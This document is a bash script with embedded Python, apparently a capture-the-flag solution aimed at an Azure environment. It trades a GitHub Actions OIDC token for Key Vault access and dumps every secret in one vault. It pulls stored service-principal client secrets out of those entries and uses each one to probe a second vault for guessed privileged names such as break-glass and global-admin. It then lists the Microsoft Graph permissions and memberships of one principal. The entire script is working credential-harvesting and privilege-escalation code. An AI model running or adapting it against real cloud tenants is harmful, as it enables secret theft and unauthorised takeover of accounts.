#!/usr/bin/env bash
set -u
: "${AZURE_CLIENT_ID:=72ff278a-9e71-43ec-bac4-2ca303f8e462}"
: "${AZURE_TENANT_ID:=3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d client_id="${AZURE_CLIENT_ID}" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
export VT
python3 - <<'PY'
import os,json,urllib.request,urllib.parse,re
VT=os.environ["VT"];TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
def api(u,t):
    try:return urllib.request.urlopen(urllib.request.Request(u,headers={"Authorization":"Bearer "+t}),timeout=20).read().decode()
    except Exception as e:
        try:return f"E{e.code}:"+e.read().decode()[:80]
        except:return "ERR"
def tok(c,x,sc):
    d=urllib.parse.urlencode({"client_id":c,"client_secret":x,"grant_type":"client_credentials","scope":sc}).encode()
    try:return json.load(urllib.request.urlopen(f"https://login.microsoftonline.com/{TID}/oauth2/v2.0/token",d,timeout=20)).get("access_token")
    except:return None
def hit(tag,s):
    for m in set(re.findall(r'DF26\{[^}]*\}',s)):print("  !!!FLAG",tag,":"," ".join(m))
PV="https://kv-tbl-prod-x3euoz.vault.azure.net"
sps=[]
for s in json.loads(api(PV+"/secrets?api-version=7.4",VT))["value"]:
    try:
        j=json.loads(json.loads(api(s["id"]+"?api-version=7.4",VT))["value"]);sps.append((s["id"].rsplit("/",1)[-1],j["appId"],j["clientSecret"]))
    except:pass
NAMES=["flag","Flag","FLAG","df26","the-flag","ctf-flag","break-glass","breakglass","emergency","emergency-access","owner","admin","root","master","master-key","legacy-admin","legacy-admin-secret","legacy-admin-password","platform-automation","automation","arm-owner","armowner","escalation","bootstrap","seed","root-secret","final","kv-flag","secret","backup-admin","global-admin"]
SEC="https://kv-tbl-sec-x3euoz.vault.azure.net"
for name,cid,sec in sps:
    vt=tok(cid,sec,"https://vault.azure.net/.default")
    if not vt:continue
    got=[]
    for n in NAMES:
        r=api(f"{SEC}/secrets/{n}?api-version=7.4",vt)
        if r.startswith("E403"):continue
        if r.startswith("E404"):got.append(n+"[404-but-access!]");continue
        hit(f"{name}:{n}",r)
        try:print(f"  [{name}] {n} =", json.loads(r).get("value","")[:300]);got.append(n+"=GOT")
        except:print(f"  [{name}] {n} ->",r[:80]);got.append(n+"?")
    if got:print(f"[{name}] notable:",got)
# directory-audit quyền Graph thật
DA="2c34300e-1bc0-41e7-9c1e-8b7571d72c72"
da=[x for x in sps if x[1]==DA]
if da:
    gt=tok(DA,da[0][2],"https://graph.microsoft.com/.default")
    spid=json.loads(api(f"https://graph.microsoft.com/v1.0/servicePrincipals?$filter=appId eq '{DA}'&$select=id",gt))["value"][0]["id"]
    G="https://graph.microsoft.com/v1.0/"
    msg=json.loads(api(G+"servicePrincipals?$filter=appId eq '00000003-0000-0000-c000-000000000000'&$select=id,appRoles",gt))["value"][0]
    rolemap={r["id"]:r["value"] for r in msg["appRoles"]}
    asg=json.loads(api(G+f"servicePrincipals/{spid}/appRoleAssignments",gt)).get("value",[])
    print("directory-audit Graph perms:",[rolemap.get(a["appRoleId"],a["appRoleId"]) for a in asg])
    for rel in ["memberOf","transitiveMemberOf","ownedObjects"]:
        d=api(G+f"servicePrincipals/{spid}/{rel}?$select=displayName,id",gt)
        try:print(" ",rel,":",[o.get("displayName") for o in json.loads(d).get("value",[])])
        except:pass
print("== done ==")
PY
